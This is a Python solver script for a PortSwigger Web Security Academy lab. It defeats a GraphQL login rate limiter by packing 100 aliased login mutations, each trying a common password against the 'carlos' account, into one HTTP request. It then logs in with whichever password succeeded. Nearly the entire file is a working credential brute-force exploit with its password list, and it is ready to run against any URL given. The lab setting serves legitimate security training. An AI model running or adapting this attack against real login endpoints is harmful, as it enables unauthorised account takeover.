#!/usr/bin/env python3
"""
Bypassing GraphQL brute force protections
PortSwigger Web Security Academy -- GraphQL API vulnerabilities

Companion script for the writeup: 04-bypassing-graphql-brute-force-protections.md

What this does:
    The rate limiter in front of the login mutation counts HTTP requests, not
    login attempts. GraphQL aliases let one HTTP request carry many independent
    mutation calls, each with its own arguments and its own resolved result --
    so this script builds a single mutation body that aliases all 100 of
    PortSwigger's standard candidate passwords against the carlos account
    (attempt0..attempt99), fires it as one POST, and scans the single response
    for the alias whose "success" field came back true.

Usage:
    python 04-bypassing-graphql-brute-force-protections.py <lab-url>
    e.g. python 04-bypassing-graphql-brute-force-protections.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

GRAPHQL_PATH = "/graphql/v1"

# PortSwigger's standard authentication password list (100 candidates).
PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "abc123", "football", "monkey",
    "letmein", "shadow", "master", "666666", "qwertyuiop",
    "123321", "mustang", "1234567890", "michael", "654321",
    "superman", "1qaz2wsx", "7777777", "121212", "000000",
    "qazwsx", "123qwe", "killer", "trustno1", "jordan",
    "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster",
    "soccer", "harley", "batman", "andrew", "tigger",
    "sunshine", "iloveyou", "2000", "charlie", "robert",
    "thomas", "hockey", "ranger", "daniel", "starwars",
    "klaster", "112233", "george", "computer", "michelle",
    "jessica", "pepper", "1111", "zxcvbn", "555555",
    "11111111", "131313", "freedom", "777777", "pass",
    "maggie", "159753", "aaaaaa", "ginger", "princess",
    "joshua", "cheese", "amanda", "summer", "love",
    "ashley", "nicole", "chelsea", "biteme", "matthew",
    "access", "yankees", "987654321", "dallas", "austin",
    "thunder", "taylor", "matrix", "mobilemail", "mom",
    "monitor", "monitoring", "montana", "moon", "moscow",
    "peter",
]


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=30)
    endpoint = f"{lab_url}{GRAPHQL_PATH}"

    aliases = [
        f'attempt{i}: login(input: {{username: "carlos", password: "{pwd}"}}) {{ token success }}'
        for i, pwd in enumerate(PASSWORDS)
    ]
    full_query = "mutation {\n" + "\n".join(aliases) + "\n}"
    print(f"[*] Built one mutation carrying all {len(PASSWORDS)} attempts "
          f"({len(full_query)} bytes).")

    r = client.post(endpoint, json={"query": full_query})
    print(f"[*] Single POST sent -- status={r.status_code}")

    body = r.json() if r.status_code == 200 else {}
    found_password = None
    for key, val in body.get("data", {}).items():
        if isinstance(val, dict) and val.get("success"):
            idx = int(key.replace("attempt", ""))
            found_password = PASSWORDS[idx]
            print(f"[+] {key} -> success: true -- password is {found_password!r}")
            break

    if not found_password:
        print("[-] No alias came back with success: true -- password not in the standard list.")
        return

    m = re.search(r'name="csrf"\s+value="([^"]+)"', client.get(f"{lab_url}/login").text)
    csrf = m.group(1) if m else ""
    client.post(f"{lab_url}/login", data={
        "csrf": csrf, "username": "carlos", "password": found_password,
    })

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- logged in as carlos with the recovered password.")
    else:
        print("[-] Login with the recovered password did not solve the lab -- double-check the csrf token.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
